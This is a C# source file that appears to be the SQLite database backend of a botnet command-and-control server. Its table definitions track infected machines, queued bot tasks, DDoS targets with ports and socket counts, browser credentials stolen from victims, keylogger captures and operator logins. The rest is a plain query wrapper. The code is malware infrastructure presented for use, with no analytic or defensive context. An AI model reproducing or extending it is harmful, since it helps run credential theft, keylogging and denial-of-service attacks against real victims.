using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Text;

namespace Server.Database
{
    class CDatabase
    {
        const string strBotsTable = "CREATE TABLE bots(bot_id INTEGER PRIMARY KEY AUTOINCREMENT, bot_ipv4 TEXT, bot_version TEXT, bot_os TEXT, bot_username TEXT, bot_hwid TEXT, bot_isonline INTEGER, bot_country TEXT)";
        const string strTasksTable = "CREATE TABLE tasks(task_id INTEGER PRIMARY KEY AUTOINCREMENT, task NUMERIC, task_parameters TEXT, task_executes INTEGER, task_executed INTEGER, task_executed_ok INTEGER)";
        const string strTasksExecutedTable = "CREATE TABLE tasks_executed(task_executed_id INTEGER PRIMARY KEY AUTOINCREMENT, task_id INTEGER, bot_id INTEGER)";
        const string strMastersTable = "CREATE TABLE masters(master_id INTEGER PRIMARY KEY AUTOINCREMENT, master_username TEXT, master_password TEXT, master_key TEXT)";
        const string strDdosTable = "CREATE TABLE ddos(ddos_id INTEGER PRIMARY KEY AUTOINCREMENT, ddos_host TEXT, ddos_port INTEGER, ddos_type INTEGER, ddos_start TEXT, ddos_stop TEXT, ddos_sockets INTEGER, ddos_interval INTEGER)";
        const string strStealerTable = "CREATE TABLE stealer_logs(steal_id INTEGER PRIMARY KEY AUTOINCREMENT, steal_browser TEXT, steal_url TEXT, steal_username TEXT, steal_password TEXT)";
        const string strKeylogTable = "CREATE TABLE key_logs(log_id INTEGER PRIMARY KEY AUTOINCREMENT, log_title TEXT, log_reports INTEGER, log_length INTEGER, log_bot_id INTEGER, log_data TEXT)";
        
        SQLiteConnection m_Connection = null;

        String FileName { get; set; }

        public CDatabase(String strFileName)
        {
            if (String.IsNullOrEmpty(strFileName))
                throw new ArgumentNullException("strFileName");

            this.FileName = strFileName;

            if (!File.Exists(strFileName))
            {
                if (this.CreateDatabase()) Console.WriteLine("Database: {0} was created successfully.", strFileName);
                else Console.WriteLine("Failed CreateDatabase.");
            }

            this.CreateConnection();
        }

        ~CDatabase()
        {
            this.CloseConnection();
        }

        Boolean CreateDatabase()
        {
            try
            {
                SQLiteConnection.CreateFile(this.FileName);

                if (this.CreateConnection())
                {
                    var lstQuery = new List<String>();

                    lstQuery.Add(strBotsTable);
                    lstQuery.Add(strTasksTable);
                    lstQuery.Add(strTasksExecutedTable);
                    lstQuery.Add(strMastersTable);
                    lstQuery.Add(strDdosTable);
                    lstQuery.Add(strStealerTable);
                    lstQuery.Add(strKeylogTable);

                    foreach (String strQuery in lstQuery.ToArray())
                    {
                        if (!this.ExecuteNonResultQuery(strQuery))
                        {
                            lstQuery.Clear();
                            File.Delete(this.FileName);
                            return false;
                        }
                    }

                    lstQuery.Clear();
                    return this.CloseConnection();
                }
            }
            catch { }
            return false;
        }

        public Boolean CreateConnection()
        {
            try
            {
                m_Connection = new SQLiteConnection(String.Format("Data Source={0};Version=3;", this.FileName));
                m_Connection.Open();
                return true;
            }
            catch { }

            return false;
        }

        public Boolean CloseConnection()
        {
            try
            {
                lock (m_Connection)
                {
                    m_Connection.Close();
                    return true;
                }
            }
            catch { }
            return false;
        }

        public Boolean ExecuteNonResultQuery(String strQuery)
        {
            try
            {
                lock (m_Connection)
                {
                    SQLiteCommand Command = new SQLiteCommand(strQuery, m_Connection);
                    Command.ExecuteNonQuery();
                    return true;
                }
            }
            catch { }

            return false;
        }

        public Int32 ExecuteCountQuery(String strQuery)
        {
            try
            {
                lock(m_Connection)
                {
                    SQLiteCommand Command = new SQLiteCommand(strQuery, m_Connection);
                    object objScalar = Command.ExecuteScalar();

                    if (objScalar != null) return Convert.ToInt32(objScalar);
                }
            }
            catch { }
            return -1;
        }

        public SQLiteDataReader ExecuteReadQuery(String strQuery)
        {
            try
            {
                lock (m_Connection)
                {
                    SQLiteCommand Command = new SQLiteCommand(strQuery, m_Connection);
                    return Command.ExecuteReader();
                }
            }
            catch { }

            return null;
        }
    }
}
